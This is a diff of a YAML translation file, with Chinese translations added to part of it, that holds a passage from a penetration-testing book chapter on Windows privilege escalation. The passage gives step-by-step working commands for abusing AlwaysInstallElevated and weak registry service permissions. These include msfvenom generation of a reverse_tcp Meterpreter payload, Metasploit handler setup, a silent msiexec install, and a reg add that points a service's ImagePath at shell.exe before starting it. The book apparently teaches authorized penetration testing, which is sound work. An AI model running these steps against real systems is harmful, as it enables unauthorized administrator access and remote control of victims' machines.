   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_009.jpg)'
+  id: totrans-130
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.9 – Meterpreter – upload custom MSI
+  id: totrans-131
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we need to set up the Meterpreter listener with Metasploit. This can be
     done by running the following command in the Metasploit console:'
+  id: totrans-132
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**use /exploit/multi/handler**'
+  id: totrans-133
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'The next step involves specifying the payload we used to create the custom
     MSI executable with MSFvenom. This can be done by running the following command:'
+  id: totrans-134
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
+  id: totrans-135
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Now, we need to configure the module options. In this case, we need to configure
     the **LHOST** and **LPORT** options, as highlighted in the following screenshot:'
+  id: totrans-136
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.10 – Meterpreter payload options'
+  id: totrans-137
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_010.jpg)'
+  id: totrans-138
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.10 – Meterpreter payload options
+  id: totrans-139
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After setting the module options, we can start the listener by running the
     following command:'
+  id: totrans-140
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '**run**'
+  id: totrans-141
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: The listener will listen for any incoming connections from the custom MSI executable
     we generated with **MSFvenom**.
+  id: totrans-142
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'The next step involves executing the custom MSI executable with the **msiexec**
     utility. This can be done by running the following command in the Windows command
     shell:'
+  id: totrans-143
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**msiexec /quiet /qn /i C:/temp/setup.msi**'
+  id: totrans-144
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'If successful, this will spawn an elevated Meterpreter session on our listener,
     as highlighted in the following screenshot:'
+  id: totrans-145
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.11 – AlwaysInstallElevated Meterpreter session'
+  id: totrans-146
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_011.jpg)'
+  id: totrans-147
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.11 – AlwaysInstallElevated Meterpreter session
+  id: totrans-148
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'This process will also add the current standard user to the local administrators''
     group. We can confirm this by running the following command in the Windows command
     shell:'
+  id: totrans-149
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**net localgroup administrators**'
+  id: totrans-150
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'As highlighted in the following screenshot, the **Win7** user has been added
     to the local administrators'' group and has administrative privileges:'
+  id: totrans-151
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.12 – Local administrators group members'
+  id: totrans-152
   prefs: []
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_012.jpg)'
+  id: totrans-153
   prefs: []
   type: TYPE_NORMAL
 - en: Figure 9.12 – Local administrators group members
+  id: totrans-154
   prefs: []
   type: TYPE_NORMAL
 - en: With that, we successfully elevated our privileges by leveraging the AlwaysInstallElevated
     feature manually.
+  id: totrans-155
   prefs: []
   type: TYPE_NORMAL
 - en: 'We can also automate the process by using a Metasploit module:'
+  id: totrans-156
   prefs: []
   type: TYPE_NORMAL
 - en: 'Load the module by running the following command:'
+  id: totrans-157
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**use exploit/windows/local/always_install_elevated**'
+  id: totrans-158
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After loading the module, you will need to set the **SESSION** option for the
     module. The **SESSION** option requires the session ID of your Meterpreter session.
     This can be done by running the following command:'
+  id: totrans-159
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**set SESSION <SESSION-ID>**'
+  id: totrans-160
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'As illustrated in the following screenshot, the **SESSION** option should reflect
     the session ID you set:'
+  id: totrans-161
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.13 – Metasploit module options'
+  id: totrans-162
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_013.jpg)'
+  id: totrans-163
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.13 – Metasploit module options
+  id: totrans-164
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'After configuring the module options, we can run the module by running the
     following command:'
+  id: totrans-165
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**run**'
+  id: totrans-166
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'If the exploit is successful, you should get a new elevated Meterpreter session,
     as highlighted in following screenshot:'
+  id: totrans-167
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.14 – Elevated Meterpreter session'
+  id: totrans-168
   prefs: []
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_014.jpg)'
+  id: totrans-169
   prefs: []
   type: TYPE_NORMAL
 - en: Figure 9.14 – Elevated Meterpreter session
+  id: totrans-170
   prefs: []
   type: TYPE_NORMAL
 - en: With that, we successfully elevated our privileges by leveraging the AlwaysInstallElevated
     feature on Windows both manually and automatically with Metasploit.
+  id: totrans-171
   prefs: []
   type: TYPE_NORMAL
 - en: Exploiting weak registry permissions
+  id: totrans-172
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
@@ -774,247 +1050,335 @@
     values of a service with a standard user account. In many cases, writing or modifying
     values in the Windows Registry is limited to administrators. However, you may
     come across services that can be modified by standard user accounts.
+  id: totrans-173
   prefs: []
   type: TYPE_NORMAL
 - en: We can leverage this vulnerability to modify the **ImagePath** (the application
     path) of a service with the path of a custom executable. This will give us an
     elevated session when the service is restarted.
+  id: totrans-174
   prefs: []
   type: TYPE_NORMAL
 - en: This technique will only work on systems that have at least one or more services
     with weak permissions.
+  id: totrans-175
   prefs: []
   type: TYPE_NORMAL
 - en: 'The exploitation process can be performed by following these steps:'
+  id: totrans-176
   prefs: []
   type: TYPE_NORMAL
 - en: The first step in this process involves identifying a list of services whose
     registry values can be modified. In this case, we can use the **winPEAS** enumeration
     tool to enumerate a list of services with registry values and their respective
     permissions.
+  id: totrans-177
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: 'The winPEAS binary can be downloaded from the following GitHub repository:
     [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe).'
+  id: totrans-178
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'Ensure you download the correct binary based on the architecture of your target
     operating system; the architecture-specific binaries can be found in the **binaries**
     folder, as highlighted in the following screenshot:'
+  id: totrans-179
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '![Figure 9.15 – winPEAS binaries'
+  id: totrans-180
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_015.jpg)'
+  id: totrans-181
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: Figure 9.15 – winPEAS binaries
+  id: totrans-182
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: After downloading the binary to our Kali VM, we need to transfer the **winPEAS.exe**
     binary to our target virtual machine.
+  id: totrans-183
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'We can transfer the **winPEAS.exe** binary to the target system with Meterpreter
     by running the following command:'
+  id: totrans-184
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**upload /<PATH-To-BINARY>/winPEASx64.exe**'
+  id: totrans-185
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: If you are using a standard command shell, you can use the **certutil** utility
     to transfer the binary to the target system.
+  id: totrans-186
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如果使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
 - en: 'After uploading the **winPEAS.exe** binary to the target system, you can enumerate
     a list of service registry values by running the following command:'
+  id: totrans-187
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 上传 **winPEAS.exe** 二进制文件到目标系统后，可以通过运行以下命令枚举服务注册表值列表：
 - en: '**.\winPEASx64.exe servicesinfo**'
+  id: totrans-188
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**.\winPEASx64.exe servicesinfo**'
 - en: 'As shown in the following screenshot, this will enumerate a list of service
     registry values that can be modified. In our case, we can identify the **regsvc**
     service, which has the required permissions:'
+  id: totrans-189
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下图所示，这将列出可以修改的服务注册表值。在我们的案例中，可以识别出具有所需权限的 **regsvc** 服务：
 - en: '![Figure 9.16 – winPEAS insecure registry service'
+  id: totrans-190
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.16 – winPEAS 不安全的注册表服务'
 - en: '](Images/B17389_09_016.jpg)'
+  id: totrans-191
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_016.jpg)'
 - en: Figure 9.16 – winPEAS insecure registry service
+  id: totrans-192
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.16 – winPEAS 不安全的注册表服务
 - en: In this case, we can modify the service and modify the **ImagePath** with the
     path to our own Meterpreter executable.
+  id: totrans-193
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们可以修改服务并更改 **ImagePath** 为我们自定义 Meterpreter 可执行文件的路径。
 - en: 'The second step in the process will involve generating the custom Meterpreter
     executable with **MSFvenom**. This can be done by running the following command
     in Kali:'
+  id: totrans-194
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 过程中的第二步是使用**MSFvenom**生成自定义的 Meterpreter 可执行文件。可以通过在 Kali 中运行以下命令完成：
 - en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT>
     -f exe > shell.exe**'
+  id: totrans-195
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT>
+    -f exe > shell.exe**'
 - en: 'After generating the executable, we can upload it to the Windows temporary
     directory, which can be found here:'
+  id: totrans-196
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 生成可执行文件后，我们可以将其上传到 Windows 临时目录，位置如下：
 - en: C:\Temp
+  id: totrans-197
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: C:\Temp
 - en: 'Now, we can upload the custom executable to the temporary directory on the
     target using Meterpreter by running the following command:'
+  id: totrans-198
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在，我们可以通过 Meterpreter 将自定义可执行文件上传到目标的临时目录，方法是运行以下命令：
 - en: '**upload /home/kali/Desktop/shell.exe**'
+  id: totrans-199
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**上传 /home/kali/Desktop/shell.exe**'
 - en: If you are using a standard command shell, you can use the **certutil** utility
     to transfer the binary to the target system.
+  id: totrans-200
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如果使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
 - en: 'As shown in the following screenshot, this will upload the Meterpreter executable
     to the temporary directory:'
+  id: totrans-201
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下图所示，这将把 Meterpreter 可执行文件上传到临时目录：
 - en: '![Figure 9.17 – Meterpreter – upload custom executable'
+  id: totrans-202
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.17 – Meterpreter – 上传自定义可执行文件'
 - en: '](Images/B17389_09_017.jpg)'
+  id: totrans-203
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_017.jpg)'
 - en: Figure 9.17 – Meterpreter – upload custom executable
+  id: totrans-204
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.17 – Meterpreter – 上传自定义可执行文件
 - en: 'Now, we need to set up the Meterpreter listener with Metasploit. This can be
     done by running the following command in the Metasploit console:'
+  id: totrans-205
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在，我们需要使用 Metasploit 设置 Meterpreter 监听器。可以通过在 Metasploit 控制台中运行以下命令来完成：
 - en: '**use /exploit/multi/handler**'
+  id: totrans-206
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**use /exploit/multi/handler**'
 - en: 'The next step involves specifying the payload we used to create the custom
     executable with **MSFvenom**. This can be done by running the following command:'
+  id: totrans-207
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 下一步是指定我们用来创建自定义可执行文件的有效载荷，使用**MSFvenom**来完成。可以通过运行以下命令来实现：
 - en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
+  id: totrans-208
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**set payload /windows/x64/meterpreter/reverse_tcp**'
 - en: 'Now, we need to configure the module options. In this case, we need to configure
     the **LHOST** and **LPORT** options, as highlighted in the following screenshot:'
+  id: totrans-209
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 现在，我们需要配置模块选项。在这种情况下，我们需要配置 **LHOST** 和 **LPORT** 选项，如下图所示：
 - en: '![Figure 9.18 – Meterpreter payload options'
+  id: totrans-210
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 9.18 – Meterpreter 有效载荷选项'
 - en: '](Images/B17389_09_018.jpg)'
+  id: totrans-211
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_09_018.jpg)'
 - en: Figure 9.18 – Meterpreter payload options
+  id: totrans-212
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 9.18 – Meterpreter 有效载荷选项
 - en: 'After setting the module options, we can start the listener by running the
     following command:'
+  id: totrans-213
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 设置模块选项后，我们可以通过运行以下命令来启动监听器：
 - en: '**run**'
+  id: totrans-214
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**run**'
 - en: The listener will listen for any incoming connections from the custom executable
     we generated with **MSFvenom**.
+  id: totrans-215
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 监听器将监听来自我们使用 **MSFvenom** 生成的自定义可执行文件的任何传入连接。
 - en: 'Now, we can modify the **ImagePath** value for the target registry service
     and set it as the path of the custom executable we generated. This can be done
     by running the following command in the Windows command shell on the target:'
+  id: totrans-216
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在，我们可以修改目标注册表服务的 **ImagePath** 值，并将其设置为我们生成的自定义可执行文件的路径。可以通过在目标的 Windows 命令行中运行以下命令来完成：
 - en: '**reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /t
     REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f**'
+  id: totrans-217
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /t
+    REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f**'
 - en: If successful, the new value should be written. Now the service will execute
     our custom executable the next time it is started or restarted.
+  id: totrans-218
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'We can start the service by running the following command in the Windows command
     shell:'
+  id: totrans-219
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '**sc start regsvc**'
+  id: totrans-220
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
 - en: 'The service will now execute our custom executable and provide us with an elevated
     Meterpreter session on the listener we set up, as highlighted in the following
     screenshot:'
+  id: totrans-221
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
 - en: '![Figure 9.19 – Elevated Meterpreter session'
+  id: totrans-222
   prefs: []
   type: TYPE_NORMAL
 - en: '](Images/B17389_09_019.jpg)'
+  id: totrans-223
   prefs: []
   type: TYPE_NORMAL
 - en: Figure 9.19 – Elevated Meterpreter session
+  id: totrans-224
   prefs: []
   type: TYPE_NORMAL
 - en: You should now have a good grasp of how to identify misconfigurations in the
     Windows Registry, as well as how to leverage them to elevate your privileges on
     a target system.
+  id: totrans-225
   prefs: []
   type: TYPE_NORMAL
 - en: Summary
+  id: totrans-226
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
@@ -1024,9 +1388,11 @@
     leveraging the AlwaysInstallElevated feature on Windows to elevate our privileges,
     both manually and automatically, with Metasploit. Finally, we looked at how to
     exploit weak registry service permissions.
+  id: totrans-227
   prefs: []
   type: TYPE_NORMAL
 - en: In the next chapter, we will begin the privilege escalation process on Linux
     by exploring the process of identifying and utilizing kernel exploits.
+  id: totrans-228
   prefs: []
   type: TYPE_NORMAL
